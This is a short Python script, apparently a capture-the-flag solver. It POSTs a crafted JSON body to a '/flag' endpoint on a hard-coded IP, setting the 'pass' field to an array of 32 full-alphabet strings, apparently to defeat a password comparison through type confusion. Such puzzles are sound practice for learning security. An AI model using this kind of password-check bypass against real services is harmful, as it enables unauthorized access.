import string
import requests


def solve():
    payload = {
        'pass': [string.ascii_letters for _ in range(32)]
    }
    r = requests.post('http://34.146.80.178:8001/flag', json=payload)
    return r.content.decode()


if __name__ == '__main__':
    print(solve())
